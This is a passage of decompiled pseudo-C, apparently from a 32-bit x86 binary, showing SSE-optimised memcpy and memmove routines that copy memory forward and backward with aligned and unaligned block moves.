    int32_t v128; // 0x408e60
    if ((g163 & 1) == 0) {
        goto lab_0x409087;
    } else {
        if ((result & 3) != 0) {
            goto lab_0x409087;
        } else {
            // 0x408eea
            v120 = a3;
            v128 = a2;
            v124 = result;
            if ((a2 & 3) == 0) {
                int32_t v129 = a3; // 0x408efa
                int32_t v130 = a2; // 0x408efa
                int32_t v131 = result; // 0x408efa
                if ((result & 4) != 0) {
                    // 0x408efc
                    *(int32_t *)result = *(int32_t *)a2;
                    v129 = a3 - 4;
                    v130 = a2 + 4;
                    v131 = result + 4;
                }
                int32_t v132 = v129; // 0x408f0d
                int32_t v133 = v130; // 0x408f0d
                int32_t v134 = v131; // 0x408f0d
                if ((v131 & 8) != 0) {
                    // 0x408f0f
                    __asm_movq_2(*(int64_t *)v131, __asm_movq(*(int64_t *)v130));
                    v132 = v129 - 8;
                    v133 = v130 + 8;
                    v134 = v131 + 8;
                }
                // 0x408f20
                int32_t v135; // 0x408e60
                int32_t v136; // 0x408e60
                int32_t v137; // 0x408e60
                if ((v133 & 7) == 0) {
                    int32_t v138 = v133 - 8; // 0x408f8d
                    int128_t v139 = __asm_movdqa_5(*(int128_t *)v138); // 0x408f95
                    int32_t v140 = v138;
                    int128_t v141 = __asm_movdqa_5(*(int128_t *)(v140 + 16)); // 0x408f98
                    int32_t v142 = v132 - 48; // 0x408f9d
                    int128_t v143 = __asm_movdqa_5(*(int128_t *)(v140 + 32)); // 0x408fa0
                    int32_t v144 = v140 + 48; // 0x408fa5
                    int128_t v145 = __asm_movdqa_5(*(int128_t *)v144); // 0x408fa5
                    int128_t v146 = __asm_movdqa_5(v141); // 0x408fb0
                    __asm_movdqa(*(int128_t *)v134, __asm_palignr(v141, v139, 8));
                    int128_t v147 = __asm_movdqa_5(v143); // 0x408fbe
                    __asm_movdqa(*(int128_t *)(v134 + 16), __asm_palignr(v143, v146, 8));
                    v139 = __asm_movdqa_5(v145);
                    __asm_movdqa(*(int128_t *)(v134 + 32), __asm_palignr(v145, v147, 8));
                    int32_t v148 = v134 + 48; // 0x408fdc
                    int32_t v149 = v142; // 0x408fdf
                    int32_t v150 = v148; // 0x408fdf
                    while (v142 > 47) {
                        // 0x408f98
                        v140 = v144;
                        v141 = __asm_movdqa_5(*(int128_t *)(v140 + 16));
                        v142 = v149 - 48;
                        v143 = __asm_movdqa_5(*(int128_t *)(v140 + 32));
                        v144 = v140 + 48;
                        v145 = __asm_movdqa_5(*(int128_t *)v144);
                        v146 = __asm_movdqa_5(v141);
                        __asm_movdqa(*(int128_t *)v150, __asm_palignr(v141, v139, 8));
                        v147 = __asm_movdqa_5(v143);
                        __asm_movdqa(*(int128_t *)(v150 + 16), __asm_palignr(v143, v146, 8));
                        v139 = __asm_movdqa_5(v145);
                        __asm_movdqa(*(int128_t *)(v150 + 32), __asm_palignr(v145, v147, 8));
                        v148 = v150 + 48;
                        v149 = v142;
                        v150 = v148;
                    }
                    // 0x408fe1
                    v135 = v142;
                    v137 = v140 + 56;
                    v136 = v148;
                } else {
                    if ((v133 & 8) == 0) {
                        int32_t v151 = v133 - 4; // 0x408fe6
                        int128_t v152 = __asm_movdqa_5(*(int128_t *)v151); // 0x408fee
                        int32_t v153 = v151;
                        int128_t v154 = __asm_movdqa_5(*(int128_t *)(v153 + 16)); // 0x408ff0
                        int32_t v155 = v132 - 48; // 0x408ff5
                        int128_t v156 = __asm_movdqa_5(*(int128_t *)(v153 + 32)); // 0x408ff8
                        int32_t v157 = v153 + 48; // 0x408ffd
                        int128_t v158 = __asm_movdqa_5(*(int128_t *)v157); // 0x408ffd
                        int128_t v159 = __asm_movdqa_5(v154); // 0x409008
                        __asm_movdqa(*(int128_t *)v134, __asm_palignr(v154, v152, 4));
                        int128_t v160 = __asm_movdqa_5(v156); // 0x409016
                        __asm_movdqa(*(int128_t *)(v134 + 16), __asm_palignr(v156, v159, 4));
                        v152 = __asm_movdqa_5(v158);
                        __asm_movdqa(*(int128_t *)(v134 + 32), __asm_palignr(v158, v160, 4));
                        int32_t v161 = v134 + 48; // 0x409034
                        int32_t v162 = v155; // 0x409037
                        int32_t v163 = v161; // 0x409037
                        while (v155 > 47) {
                            // 0x408ff0
                            v153 = v157;
                            v154 = __asm_movdqa_5(*(int128_t *)(v153 + 16));
                            v155 = v162 - 48;
                            v156 = __asm_movdqa_5(*(int128_t *)(v153 + 32));
                            v157 = v153 + 48;
                            v158 = __asm_movdqa_5(*(int128_t *)v157);
                            v159 = __asm_movdqa_5(v154);
                            __asm_movdqa(*(int128_t *)v163, __asm_palignr(v154, v152, 4));
                            v160 = __asm_movdqa_5(v156);
                            __asm_movdqa(*(int128_t *)(v163 + 16), __asm_palignr(v156, v159, 4));
                            v152 = __asm_movdqa_5(v158);
                            __asm_movdqa(*(int128_t *)(v163 + 32), __asm_palignr(v158, v160, 4));
                            v161 = v163 + 48;
                            v162 = v155;
                            v163 = v161;
                        }
                        // 0x409039
                        v135 = v155;
                        v137 = v153 + 52;
                        v136 = v161;
                    } else {
                        int32_t v164 = v133 - 12; // 0x408f32
                        int128_t v165 = __asm_movdqa_5(*(int128_t *)v164); // 0x408f3a
                        int32_t v166 = v164;
                        int128_t v167 = __asm_movdqa_5(*(int128_t *)(v166 + 16)); // 0x408f3c
                        int32_t v168 = v132 - 48; // 0x408f41
                        int128_t v169 = __asm_movdqa_5(*(int128_t *)(v166 + 32)); // 0x408f44
                        int32_t v170 = v166 + 48; // 0x408f49
                        int128_t v171 = __asm_movdqa_5(*(int128_t *)v170); // 0x408f49
                        int128_t v172 = __asm_movdqa_5(v167); // 0x408f54
                        __asm_movdqa(*(int128_t *)v134, __asm_palignr(v167, v165, 12));
                        int128_t v173 = __asm_movdqa_5(v169); // 0x408f62
                        __asm_movdqa(*(int128_t *)(v134 + 16), __asm_palignr(v169, v172, 12));
                        v165 = __asm_movdqa_5(v171);
                        __asm_movdqa(*(int128_t *)(v134 + 32), __asm_palignr(v171, v173, 12));
                        int32_t v174 = v134 + 48; // 0x408f80
                        int32_t v175 = v168; // 0x408f83
                        int32_t v176 = v174; // 0x408f83
                        while (v168 > 47) {
                            // 0x408f3c
                            v166 = v170;
                            v167 = __asm_movdqa_5(*(int128_t *)(v166 + 16));
                            v168 = v175 - 48;
                            v169 = __asm_movdqa_5(*(int128_t *)(v166 + 32));
                            v170 = v166 + 48;
                            v171 = __asm_movdqa_5(*(int128_t *)v170);
                            v172 = __asm_movdqa_5(v167);
                            __asm_movdqa(*(int128_t *)v176, __asm_palignr(v167, v165, 12));
                            v173 = __asm_movdqa_5(v169);
                            __asm_movdqa(*(int128_t *)(v176 + 16), __asm_palignr(v169, v172, 12));
                            v165 = __asm_movdqa_5(v171);
                            __asm_movdqa(*(int128_t *)(v176 + 32), __asm_palignr(v171, v173, 12));
                            v174 = v176 + 48;
                            v175 = v168;
                            v176 = v174;
                        }
                        // 0x408f85
                        v135 = v168;
                        v137 = v166 + 60;
                        v136 = v174;
                    }
                }
                int32_t v177 = v135; // 0x40903f
                int32_t v178 = v137; // 0x40903f
                int32_t v179 = v136; // 0x40903f
                if (v135 >= 16) {
                    int128_t v180 = __asm_movdqu_6(*(int128_t *)v137); // 0x409041
                    int32_t v181 = v135 - 16; // 0x409045
                    int32_t v182 = v137 + 16; // 0x409048
                    __asm_movdqa(*(int128_t *)v136, v180);
                    int32_t v183 = v136 + 16; // 0x40904f
                    int32_t v184 = v183; // 0x40903f
                    int32_t v185 = v182; // 0x40903f
                    int32_t v186 = v181; // 0x40903f
                    while (v181 >= 16) {
                        // 0x409041
                        v180 = __asm_movdqu_6(*(int128_t *)v185);
                        v181 = v186 - 16;
                        v182 = v185 + 16;
                        __asm_movdqa(*(int128_t *)v184, v180);
                        v183 = v184 + 16;
                        v184 = v183;
                        v185 = v182;
                        v186 = v181;
                    }
                    // 0x40903c
                    v177 = v135 & 15;
                    v178 = v182;
                    v179 = v183;
                }
                int32_t v187 = v177; // 0x409058
                int32_t v188 = v178; // 0x409058
                int32_t v189 = v179; // 0x409058
                if ((v177 & 4) != 0) {
                    // 0x40905a
                    *(int32_t *)v179 = *(int32_t *)v178;
                    v187 = v177 - 4;
                    v188 = v178 + 4;
                    v189 = v179 + 4;
                }
                int32_t v190 = v187; // 0x408e60
                int32_t v191 = v188; // 0x408e60
                int32_t v192 = v189; // 0x408e60
                while (true) {
                  lab_0x40907e:
                    // 0x40907e
                    g260 = v190;
                    v125 = v191;
                    v121 = v192;
                    v126 = v191;
                    v122 = v192;
                    v127 = v191;
                    v123 = v192;
                    switch (v190) {
                        case 0: {
                            return result;
                        }
                        case 1: {
                            goto lab_0x4090dc;
                        }
                        case 2: {
                            goto lab_0x4090e8;
                        }
                        case 3: {
                            goto lab_0x4090fc;
                        }
                        default: {
                            // 0x40906d
                            __asm_movq_2(*(int64_t *)v192, __asm_movq(*(int64_t *)v191));
                            v190 -= 8;
                            v191 += 8;
                            v192 += 8;
                            goto lab_0x40907e;
                        }
                    }
                }
                // 0x4090d4
                return result;
            }
            goto lab_0x4090a2;
        }
    }
  lab_0x409087:
    // 0x409087
    v120 = a3;
    v128 = a2;
    v124 = result;
    if ((result & 3) != 0) {
        *(char *)result = *(char *)a2;
        int32_t v193 = a3 - 1; // 0x409093
        int32_t v194 = a2 + 1; // 0x409094
        int32_t v195 = result + 1; // 0x409097
        int32_t v196 = v193; // 0x4090a0
        int32_t v197 = v194; // 0x4090a0
        int32_t v198 = v195; // 0x4090a0
        v120 = v193;
        v128 = v194;
        v124 = v195;
        while ((v195 & 3) != 0) {
            // 0x40908f
            *(char *)v198 = *(char *)v197;
            v193 = v196 - 1;
            v194 = v197 + 1;
            v195 = v198 + 1;
            v196 = v193;
            v197 = v194;
            v198 = v195;
            v120 = v193;
            v128 = v194;
            v124 = v195;
        }
    }
    goto lab_0x4090a2;
  lab_0x409331:
    // 0x409331
    v61 = v64;
    v62 = v66;
    v63 = v65;
    if (v64 >= 32) {
        int128_t v203 = __asm_movdqu_6(*(int128_t *)v66); // 0x409340
        int128_t v204 = __asm_movdqu_6(*(int128_t *)(v66 + 16)); // 0x409344
        __asm_movdqu(*(int128_t *)v65, v203);
        __asm_movdqu(*(int128_t *)(v65 + 16), v204);
        int32_t v205 = v66 + 32; // 0x409352
        int32_t v206 = v65 + 32; // 0x409355
        int32_t v207 = v64 / 32 - 1; // 0x409358
        int32_t v208 = v207; // 0x409359
        int32_t v209 = v205; // 0x409359
        int32_t v210 = v206; // 0x409359
        v61 = v64;
        v62 = v205;
        v63 = v206;
        while (v207 != 0) {
            // 0x409340
            v203 = __asm_movdqu_6(*(int128_t *)v209);
            v204 = __asm_movdqu_6(*(int128_t *)(v209 + 16));
            __asm_movdqu(*(int128_t *)v210, v203);
            __asm_movdqu(*(int128_t *)(v210 + 16), v204);
            v205 = v209 + 32;
            v206 = v210 + 32;
            v207 = v208 - 1;
            v208 = v207;
            v209 = v205;
            v210 = v206;
            v61 = v64;
            v62 = v205;
            v63 = v206;
        }
    }
    goto lab_0x40935b;
  lab_0x4090a2:;
    uint32_t v199 = v120 / 4; // 0x4090ad
    __asm_rep_movsd_memcpy((char *)v124, (char *)v128, v199);
    bool v200; // 0x408e60
    int32_t v201 = v124 + v199 * (v200 ? -4 : 4); // 0x4090b0
    int32_t v202 = v120 & 3; // 0x4090b2
    g261 = v202;
    v125 = v201;
    v121 = v201;
    v126 = v201;
    v122 = v201;
    v127 = v201;
    v123 = v201;
    switch (v202) {
        case 0: {
            // 0x4090d4
            return result;
        }
        case 1: {
          lab_0x4090dc:
            // 0x4090dc
            *(char *)v121 = *(char *)v125;
            return result;
        }
        case 2: {
          lab_0x4090e8:
            // 0x4090e8
            *(char *)v122 = *(char *)v126;
            *(char *)(v122 + 1) = *(char *)(v126 + 1);
            return result;
        }
        case 3: {
          lab_0x4090fc:
            // 0x4090fc
            *(char *)v123 = *(char *)v127;
            *(char *)(v123 + 1) = *(char *)(v127 + 1);
            *(char *)(v123 + 2) = *(char *)(v127 + 2);
            return result;
        }
    }
    // 0x40935b2
    // UNREACHABLE
}

// Address range: 0x4093e0 - 0x409954
int32_t function_4093e0(int32_t result, int32_t a2, int32_t a3) {
    int32_t v1 = a3 + a2; // 0x4093f2
    if (result > a2 == v1 > result) {
        int32_t v2 = a3 + result; // 0x409697
        int32_t v3 = a3; // 0x40969d
        int32_t v4 = v1; // 0x40969d
        int32_t v5 = v2; // 0x40969d
        if (a3 >= 32) {
            // 0x4096a3
            if ((g114 & 2) == 0) {
                int32_t v6 = v2 & 3; // 0x4096b1
                int32_t v7 = a3; // 0x4096b7
                int32_t v8 = v1; // 0x4096b7
                int32_t v9 = v2; // 0x4096b7
                if (v6 != 0) {
                    int32_t v10 = v1 - 1; // 0x4096c0
                    int32_t v11 = v2 - 1; // 0x4096c3
                    *(char *)v11 = *(char *)v10;
                    int32_t v12 = v6 - 1; // 0x4096c8
                    int32_t v13 = v12; // 0x4096cb
                    int32_t v14 = v10; // 0x4096cb
                    int32_t v15 = v11; // 0x4096cb
                    while (v12 != 0) {
                        // 0x4096c0
                        v10 = v14 - 1;
                        v11 = v15 - 1;
                        *(char *)v11 = *(char *)v10;
                        v12 = v13 - 1;
                        v13 = v12;
                        v14 = v10;
                        v15 = v11;
                    }
                    // 0x4096d6
                    v7 = a3 - v6;
                    v8 = v10;
                    v9 = v11;
                }
                // 0x4096d6
                __asm_rep_movsd_memcpy((char *)(v9 - 4), (char *)(v8 - 4), v7 / 4);
                g265 = v7 & 3;
                // 0x409654
                return result;
            }
            int32_t v16 = a3; // 0x40974b
            int32_t v17 = v1; // 0x40974b
            int32_t v18 = v2; // 0x40974b
            if ((v2 & 15) != 0) {
                int32_t v19 = a3 - 1; // 0x40974d
                int32_t v20 = v1 - 1; // 0x40974e
                int32_t v21 = v2 - 1; // 0x40974f
                *(char *)v21 = *(char *)v20;
                int32_t v22 = v19; // 0x40975a
                int32_t v23 = v20; // 0x40975a
                int32_t v24 = v21; // 0x40975a
                v16 = v19;
                v17 = v20;
                v18 = v21;
                while ((v21 & 15) != 0) {
                    // 0x40974d
                    v19 = v22 - 1;
                    v20 = v23 - 1;
                    v21 = v24 - 1;
                    *(char *)v21 = *(char *)v20;
                    v22 = v19;
                    v23 = v20;
                    v24 = v21;
                    v16 = v19;
                    v17 = v20;
                    v18 = v21;
                }
            }
            int32_t v25 = v16; // 0x4097be
            int32_t v26 = v18;
            int32_t v27 = v17;
            int32_t v28 = v25; // 0x409762
            int32_t v29 = v27; // 0x409762
            int32_t v30 = v26; // 0x409762
            while (v25 >= 128) {
                int32_t v31 = v27 - 128; // 0x409764
                int32_t v32 = v26 - 128; // 0x40976a
                int128_t v33 = __asm_movdqu_6(*(int128_t *)v31); // 0x409770
                int128_t v34 = __asm_movdqu_6(*(int128_t *)(v27 - 112)); // 0x409774
                int128_t v35 = __asm_movdqu_6(*(int128_t *)(v27 - 96)); // 0x409779
                int128_t v36 = __asm_movdqu_6(*(int128_t *)(v27 - 80)); // 0x40977e
                int128_t v37 = __asm_movdqu_6(*(int128_t *)(v27 - 64)); // 0x409783
                int128_t v38 = __asm_movdqu_6(*(int128_t *)(v27 - 48)); // 0x409788
                int128_t v39 = __asm_movdqu_6(*(int128_t *)(v27 - 32)); // 0x40978d
                int128_t v40 = __asm_movdqu_6(*(int128_t *)(v27 - 16)); // 0x409792
                __asm_movdqu(*(int128_t *)v32, v33);
                __asm_movdqu(*(int128_t *)(v26 - 112), v34);
                __asm_movdqu(*(int128_t *)(v26 - 96), v35);
                __asm_movdqu(*(int128_t *)(v26 - 80), v36);
                __asm_movdqu(*(int128_t *)(v26 - 64), v37);
                __asm_movdqu(*(int128_t *)(v26 - 48), v38);
                __asm_movdqu(*(int128_t *)(v26 - 32), v39);
                __asm_movdqu(*(int128_t *)(v26 - 16), v40);
                v25 -= 128;
                v28 = v25;
                v29 = v31;
                v30 = v32;
                if (v25 < 128) {
                    // break -> 0x4097cc
                    break;
                }
                v26 = v32;
                v27 = v31;
                v28 = v25;
                v29 = v27;
                v30 = v26;
            }
            // 0x4097cc
            v3 = v28;
            v4 = v29;
            v5 = v30;
            if (v28 >= 32) {
                int32_t v41 = v29 - 32; // 0x4097d1
                int32_t v42 = v30 - 32; // 0x4097d4
                int128_t v43 = __asm_movdqu_6(*(int128_t *)v41); // 0x4097d7
                int128_t v44 = __asm_movdqu_6(*(int128_t *)(v29 - 16)); // 0x4097db
                __asm_movdqu(*(int128_t *)v42, v43);
                __asm_movdqu(*(int128_t *)(v30 - 16), v44);
                int32_t v45 = v28 - 32; // 0x4097e9
                int32_t v46 = v45; // 0x4097f2
                int32_t v47 = v41; // 0x4097f2
                int32_t v48 = v42; // 0x4097f2
                v3 = v45;
                v4 = v41;
                v5 = v42;
                while (v45 >= 32) {
                    // 0x4097d1
                    v41 = v47 - 32;
                    v42 = v48 - 32;
                    v43 = __asm_movdqu_6(*(int128_t *)v41);
                    v44 = __asm_movdqu_6(*(int128_t *)(v47 - 16));
                    __asm_movdqu(*(int128_t *)v42, v43);
                    __asm_movdqu(*(int128_t *)(v48 - 16), v44);
                    v45 = v46 - 32;
                    v46 = v45;
                    v47 = v41;
                    v48 = v42;
                    v3 = v45;
                    v4 = v41;
                    v5 = v42;
                }
            }
        }
        int32_t v49 = v3; // 0x4097fa
        int32_t v50 = v4; // 0x4097fa
        int32_t v51 = v5; // 0x4097fa
        if (v3 >= 4) {
            int32_t v52 = v5 - 4; // 0x4097fc
            int32_t v53 = v4 - 4; // 0x4097ff
            *(int32_t *)v52 = *(int32_t *)v53;
            int32_t v54 = v3 - 4; // 0x409806
            int32_t v55 = v54; // 0x40980f
            int32_t v56 = v53; // 0x40980f
            int32_t v57 = v52; // 0x40980f
            v49 = v54;
            v50 = v53;
            v51 = v52;
            while (v54 >= 4) {
                // 0x4097fc
                v52 = v57 - 4;
                v53 = v56 - 4;
                *(int32_t *)v52 = *(int32_t *)v53;
                v54 = v55 - 4;
                v55 = v54;
                v56 = v53;
                v57 = v52;
                v49 = v54;
                v50 = v53;
                v51 = v52;
            }
        }
        int32_t v58 = v49; // 0x409813
        int32_t v59 = v50; // 0x409813
        if (v49 == 0) {
            // 0x409654
            return result;
        }
        int32_t v60 = v51; // 0x409813
        v60--;
        v59--;
        *(char *)v60 = *(char *)v59;
        v58--;
        while (v58 != 0) {
            // 0x409815
            v60--;
            v59--;
            *(char *)v60 = *(char *)v59;
            v58--;
        }
        // 0x409654
        return result;
    }
    int32_t v61 = a3; // 0x409403
    int32_t v62 = a2; // 0x409403
    int32_t v63 = result; // 0x409403
    int32_t v64; // 0x4093e0
    int32_t v65; // 0x4093e0
    int32_t v66; // 0x4093e0
    int32_t v67; // bp-8, 0x4093e0
    if (a3 < 32) {
        goto lab_0x4098db;
    } else {
        if (a3 >= 128) {
            // 0x409424
            if ((g163 & 2) != 0) {
                // 0x40942e
                __asm_rep_movsb_memcpy((char *)result, (char *)a2, a3);
                return result;
            }
            if (((a2 ^ result) & 15) != 0) {
                goto lab_0x409450;
            } else {
                // 0x409442
                if ((g114 & 2) == 0) {
                    goto lab_0x409450;
                } else {
                    int32_t v68 = a2 & 15; // 0x409832
                    int32_t v69 = a3; // 0x409837
                    int32_t v70 = a2; // 0x409837
                    int32_t v71 = result; // 0x409837
                    if (v68 != 0) {
                        uint32_t v72 = 16 - v68; // 0x409925
                        int32_t v73 = v72 & 3; // 0x40992e
                        int32_t v74 = a2; // 0x409931
                        int32_t v75 = result; // 0x409931
                        if (v73 != 0) {
                            *(char *)result = *(char *)a2;
                            int32_t v76 = a2 + 1; // 0x409937
                            int32_t v77 = result + 1; // 0x409938
                            int32_t v78 = v73 - 1; // 0x409939
                            int32_t v79 = v78; // 0x40993a
                            int32_t v80 = v76; // 0x40993a
                            int32_t v81 = v77; // 0x40993a
                            v74 = v76;
                            v75 = v77;
                            while (v78 != 0) {
                                // 0x409933
                                *(char *)v81 = *(char *)v80;
                                v76 = v80 + 1;
                                v77 = v81 + 1;
                                v78 = v79 - 1;
                                v79 = v78;
                                v80 = v76;
                                v81 = v77;
                                v74 = v76;
                                v75 = v77;
                            }
                        }
                        int32_t v82 = a3 - v72; // 0x409927
                        v69 = v82;
                        v70 = v74;
                        v71 = v75;
                        if (v72 >= 4) {
                            *(int32_t *)v75 = *(int32_t *)v74;
                            int32_t v83 = v74 + 4; // 0x409945
                            int32_t v84 = v75 + 4; // 0x409948
                            int32_t v85 = v72 / 4 - 1; // 0x40994b
                            v69 = v82;
                            v70 = v83;
                            v71 = v84;
                            int32_t v86 = v85; // 0x40994c
                            int32_t v87 = v83; // 0x40994c
                            int32_t v88 = v84; // 0x40994c
                            while (v85 != 0) {
                                // 0x409941
                                *(int32_t *)v88 = *(int32_t *)v87;
                                v83 = v87 + 4;
                                v84 = v88 + 4;
                                v85 = v86 - 1;
                                v69 = v82;
                                v70 = v83;
                                v71 = v84;
                                v86 = v85;
                                v87 = v83;
                                v88 = v84;
                            }
                        }
                    }
                    int32_t v89 = v70; // 0x409845
                    int32_t v90 = v71; // 0x409845
                    if (v69 >= 128) {
                        int128_t v91 = __asm_movdqa_5(*(int128_t *)v70); // 0x409850
                        int128_t v92 = __asm_movdqa_5(*(int128_t *)(v70 + 16)); // 0x409854
                        int128_t v93 = __asm_movdqa_5(*(int128_t *)(v70 + 32)); // 0x409859
                        int128_t v94 = __asm_movdqa_5(*(int128_t *)(v70 + 48)); // 0x40985e
                        __asm_movdqa(*(int128_t *)v71, v91);
                        __asm_movdqa(*(int128_t *)(v71 + 16), v92);
                        __asm_movdqa(*(int128_t *)(v71 + 32), v93);
                        __asm_movdqa(*(int128_t *)(v71 + 48), v94);
                        int128_t v95 = __asm_movdqa_5(*(int128_t *)(v70 + 64)); // 0x409876
                        int128_t v96 = __asm_movdqa_5(*(int128_t *)(v70 + 80)); // 0x40987b
                        int128_t v97 = __asm_movdqa_5(*(int128_t *)(v70 + 96)); // 0x409880
                        int128_t v98 = __asm_movdqa_5(*(int128_t *)(v70 + 112)); // 0x409885
                        __asm_movdqa(*(int128_t *)(v71 + 64), v95);
                        __asm_movdqa(*(int128_t *)(v71 + 80), v96);
                        __asm_movdqa(*(int128_t *)(v71 + 96), v97);
                        __asm_movdqa(*(int128_t *)(v71 + 112), v98);
                        int32_t v99 = v70 + 128; // 0x40989e
                        int32_t v100 = v71 + 128; // 0x4098a4
                        int32_t v101 = v69 / 128 - 1; // 0x4098aa
                        int32_t v102 = v101; // 0x4098ab
                        int32_t v103 = v99; // 0x4098ab
                        int32_t v104 = v100; // 0x4098ab
                        v89 = v99;
                        v90 = v100;
                        while (v101 != 0) {
                            // 0x409850
                            v91 = __asm_movdqa_5(*(int128_t *)v103);
                            v92 = __asm_movdqa_5(*(int128_t *)(v103 + 16));
                            v93 = __asm_movdqa_5(*(int128_t *)(v103 + 32));
                            v94 = __asm_movdqa_5(*(int128_t *)(v103 + 48));
                            __asm_movdqa(*(int128_t *)v104, v91);
                            __asm_movdqa(*(int128_t *)(v104 + 16), v92);
                            __asm_movdqa(*(int128_t *)(v104 + 32), v93);
                            __asm_movdqa(*(int128_t *)(v104 + 48), v94);
                            v95 = __asm_movdqa_5(*(int128_t *)(v103 + 64));
                            v96 = __asm_movdqa_5(*(int128_t *)(v103 + 80));
                            v97 = __asm_movdqa_5(*(int128_t *)(v103 + 96));
                            v98 = __asm_movdqa_5(*(int128_t *)(v103 + 112));
                            __asm_movdqa(*(int128_t *)(v104 + 64), v95);
                            __asm_movdqa(*(int128_t *)(v104 + 80), v96);
                            __asm_movdqa(*(int128_t *)(v104 + 96), v97);
                            __asm_movdqa(*(int128_t *)(v104 + 112), v98);
                            v99 = v103 + 128;
                            v100 = v104 + 128;
                            v101 = v102 - 1;
                            v102 = v101;
                            v103 = v99;
                            v104 = v100;
                            v89 = v99;
                            v90 = v100;
                        }
                    }
                    int32_t v105 = v69 & 127; // 0x40983f
                    v65 = v90;
                    v66 = v89;
                    v64 = v105;
                    if (v105 == 0) {
                        // 0x409910
                        return *(int32_t *)((int32_t)&v67 + 12);
                    }
                    goto lab_0x4098b1;
                }
            }
        } else {
            // 0x409411
            v65 = result;
            v66 = a2;
            v64 = a3;
            if ((g114 & 2) == 0) {
                goto lab_0x409607;
            } else {
                goto lab_0x4098b1;
            }
        }
    }
  lab_0x4098db:;
    uint32_t v106 = v61 & 31; // 0x4098db
    if (v106 == 0) {
        // 0x409910
        return *(int32_t *)((int32_t)&v67 + 12);
    }
    int32_t v107 = v62; // 0x4098e5
    int32_t v108 = v63; // 0x4098e5
    if (v106 >= 4) {
        *(int32_t *)v63 = *(int32_t *)v62;
        int32_t v109 = v63 + 4; // 0x4098eb
        int32_t v110 = v62 + 4; // 0x4098ee
        int32_t v111 = v106 / 4 - 1; // 0x4098f1
        int32_t v112 = v111; // 0x4098f4
        int32_t v113 = v110; // 0x4098f4
        int32_t v114 = v109; // 0x4098f4
        v107 = v110;
        v108 = v109;
        while (v111 != 0) {
            // 0x4098e7
            *(int32_t *)v114 = *(int32_t *)v113;
            v109 = v114 + 4;
            v110 = v113 + 4;
            v111 = v112 - 1;
            v112 = v111;
            v113 = v110;
            v114 = v109;
            v107 = v110;
            v108 = v109;
        }
    }
    int32_t v115 = v61 & 3; // 0x4098f8
    int32_t v116 = v107; // 0x4098fb
    if (v115 == 0) {
        // 0x409910
        return *(int32_t *)((int32_t)&v67 + 12);
    }
    int32_t v117 = v108; // 0x4098fb
    *(char *)v117 = *(char *)v116;
    int32_t v118 = v115 - 1; // 0x409903
    int32_t v119 = v118; // 0x409904
    v116++;
    v117++;
    while (v118 != 0) {
        // 0x4098fd
        *(char *)v117 = *(char *)v116;
        v118 = v119 - 1;
        v119 = v118;
        v116++;
        v117++;
    }
    // 0x409910
    return *(int32_t *)((int32_t)&v67 + 12);
  lab_0x409450:;
    int32_t v120; // 0x4093e0
    int32_t v121; // 0x4093e0
    int32_t v122; // 0x4093e0
    int32_t v123; // 0x4093e0
    int32_t v124; // 0x4093e0
    int32_t v125; // 0x4093e0
    int32_t v126; // 0x4093e0
    int32_t v127; // 0x4093e0
    int32_t v128; // 0x4093e0
    if ((g163 & 1) == 0) {
        goto lab_0x409607;
    } else {
        if ((result & 3) != 0) {
            goto lab_0x409607;
        } else {
            // 0x40946a
            v120 = a3;
            v128 = a2;
            v124 = result;
            if ((a2 & 3) == 0) {
                int32_t v129 = a3; // 0x40947a
                int32_t v130 = a2; // 0x40947a
                int32_t v131 = result; // 0x40947a
                if ((result & 4) != 0) {
                    // 0x40947c
                    *(int32_t *)result = *(int32_t *)a2;
                    v129 = a3 - 4;
                    v130 = a2 + 4;
                    v131 = result + 4;
                }
                int32_t v132 = v129; // 0x40948d
                int32_t v133 = v130; // 0x40948d
                int32_t v134 = v131; // 0x40948d
                if ((v131 & 8) != 0) {
                    // 0x40948f
                    __asm_movq_2(*(int64_t *)v131, __asm_movq(*(int64_t *)v130));
                    v132 = v129 - 8;
                    v133 = v130 + 8;
                    v134 = v131 + 8;
                }
                // 0x4094a0
                int32_t v135; // 0x4093e0
                int32_t v136; // 0x4093e0
                int32_t v137; // 0x4093e0
                if ((v133 & 7) == 0) {
                    int32_t v138 = v133 - 8; // 0x40950d
                    int128_t v139 = __asm_movdqa_5(*(int128_t *)v138); // 0x409515
                    int32_t v140 = v138;
                    int128_t v141 = __asm_movdqa_5(*(int128_t *)(v140 + 16)); // 0x409518
                    int32_t v142 = v132 - 48; // 0x40951d
                    int128_t v143 = __asm_movdqa_5(*(int128_t *)(v140 + 32)); // 0x409520
                    int32_t v144 = v140 + 48; // 0x409525
                    int128_t v145 = __asm_movdqa_5(*(int128_t *)v144); // 0x409525
                    int128_t v146 = __asm_movdqa_5(v141); // 0x409530
                    __asm_movdqa(*(int128_t *)v134, __asm_palignr(v141, v139, 8));
                    int128_t v147 = __asm_movdqa_5(v143); // 0x40953e
                    __asm_movdqa(*(int128_t *)(v134 + 16), __asm_palignr(v143, v146, 8));
                    v139 = __asm_movdqa_5(v145);
                    __asm_movdqa(*(int128_t *)(v134 + 32), __asm_palignr(v145, v147, 8));
                    int32_t v148 = v134 + 48; // 0x40955c
                    int32_t v149 = v142; // 0x40955f
                    int32_t v150 = v148; // 0x40955f
                    while (v142 > 47) {
                        // 0x409518
                        v140 = v144;
                        v141 = __asm_movdqa_5(*(int128_t *)(v140 + 16));
                        v142 = v149 - 48;
                        v143 = __asm_movdqa_5(*(int128_t *)(v140 + 32));
                        v144 = v140 + 48;
                        v145 = __asm_movdqa_5(*(int128_t *)v144);
                        v146 = __asm_movdqa_5(v141);
                        __asm_movdqa(*(int128_t *)v150, __asm_palignr(v141, v139, 8));
                        v147 = __asm_movdqa_5(v143);
                        __asm_movdqa(*(int128_t *)(v150 + 16), __asm_palignr(v143, v146, 8));
                        v139 = __asm_movdqa_5(v145);
                        __asm_movdqa(*(int128_t *)(v150 + 32), __asm_palignr(v145, v147, 8));
                        v148 = v150 + 48;
                        v149 = v142;
                        v150 = v148;
                    }
                    // 0x409561
                    v135 = v142;
                    v137 = v140 + 56;
                    v136 = v148;
                } else {
                    if ((v133 & 8) == 0) {
                        int32_t v151 = v133 - 4; // 0x409566
                        int128_t v152 = __asm_movdqa_5(*(int128_t *)v151); // 0x40956e
                        int32_t v153 = v151;
                        int128_t v154 = __asm_movdqa_5(*(int128_t *)(v153 + 16)); // 0x409570
                        int32_t v155 = v132 - 48; // 0x409575
                        int128_t v156 = __asm_movdqa_5(*(int128_t *)(v153 + 32)); // 0x409578
                        int32_t v157 = v153 + 48; // 0x40957d
                        int128_t v158 = __asm_movdqa_5(*(int128_t *)v157); // 0x40957d
                        int128_t v159 = __asm_movdqa_5(v154); // 0x409588
